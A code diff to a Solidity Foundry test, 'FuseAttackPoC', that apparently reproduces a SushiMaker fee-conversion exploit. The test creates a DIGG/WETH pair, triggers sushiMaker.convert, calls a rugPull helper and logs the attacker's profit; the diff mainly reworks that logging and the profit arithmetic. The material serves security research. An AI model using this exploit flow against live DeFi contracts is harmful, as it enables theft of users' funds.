@@ -31,39 +31,44 @@ contract FuseAttackPoC is Test {
         IERC20 digg = IERC20(diggWBTCPair.token1());
 
         sushiAttack.createAndProvideLiquidity{value:0.001 ether}(wbtc, digg);
+        //This is the pair that was just created by the attacker.
         IUniswapV2Pair diggWETHPair = IUniswapV2Pair(sushiFactory.getPair(address(weth), address(digg)));
         (uint112 reserveDigg, uint112 reserveWeth,) = diggWETHPair.getReserves();
-        uint256 lpBalance = diggWETHPair.balanceOf(myAddress);
 
-        uint256 initialBalance = address(myAddress).balance / 1 ether;
-        emit log_named_uint("ETH Balance", initialBalance);
-        emit log_named_address("Digg WETH Pair Address", address(diggWETHPair));
-        emit log_named_uint("Reserves of Digg", reserveDigg);
-        emit log_named_uint("Reserves of WETH", reserveWeth);
-        emit log_named_uint("Attacker WETH at this point", lpBalance);
+        uint256 lpBalance = diggWETHPair.balanceOf(myAddress);
+        uint256 initialBalance = address(myAddress).balance;
+        emit log_named_address("Fees are sent to", sushiFactory.feeTo());
+        emit log_named_address("Bridge for WBTC", sushiMaker.bridgeFor(address(wbtc)));
+        emit log_named_address("Bridge for DIGG", sushiMaker.bridgeFor(address(digg)));
+
+        emit log_named_uint("ETH Balance in gwei", initialBalance / 1 gwei);
+        emit log_named_address("Digg/WETH Pair Address", address(diggWETHPair));
+        emit log_named_uint("Reserves of DIGG in DIGG/WETH pair", reserveDigg);
+        emit log_named_uint("Reserves of WETH in DIGG/WETH pair", reserveWeth);
+        emit log_named_uint("LP balance", lpBalance);
         assertEq(lpBalance, 0); // No weth at this point.
 
         // Make a trade
         sushiMaker.convert(address(wbtc),address(digg));
         (uint112 reserveDigg1, uint112 reserveWeth1,) = diggWETHPair.getReserves();
-        uint256 lpBalance1 = diggWETHPair.balanceOf(myAddress) / 1 ether;
+        uint256 lpBalance1 = diggWETHPair.balanceOf(myAddress);
 
         emit log_named_uint("ETH Balance", address(myAddress).balance / 1 ether);
         emit log_named_uint("Reserves of Digg", reserveDigg1);
         emit log_named_uint("Reserves of WETH", reserveWeth1);
-        emit log_named_uint("Attacker WETH at this point", lpBalance1);
+        emit log_named_uint("LP balance", lpBalance1);
 
         sushiAttack.rugPull(diggWETHPair, wbtc);
 
         (uint112 reserveDigg2, uint112 reserveWeth2,) = diggWETHPair.getReserves();
         uint256 lpBalance2 = diggWETHPair.balanceOf(myAddress);
 
-        emit log_named_uint("ETH Balance", address(this).balance);
+        emit log_named_uint("ETH Balance", address(myAddress).balance / 1 ether);
         emit log_named_uint("Reserves of Digg", reserveDigg2);
         emit log_named_uint("Reserves of WETH", reserveWeth2);
-        emit log_named_uint("Attacker WETH at this point", lpBalance2);
-        uint profit = (address(myAddress).balance / 1 ether) - initialBalance;
-        emit log_named_uint("Total profit:", profit);
+        emit log_named_uint("LP Balance", lpBalance2);
+        uint profit = (address(myAddress).balance - initialBalance) / 1 ether;
+        emit log_named_uint("Total profit", profit);
         vm.stopPrank();
         assert(true);
     }
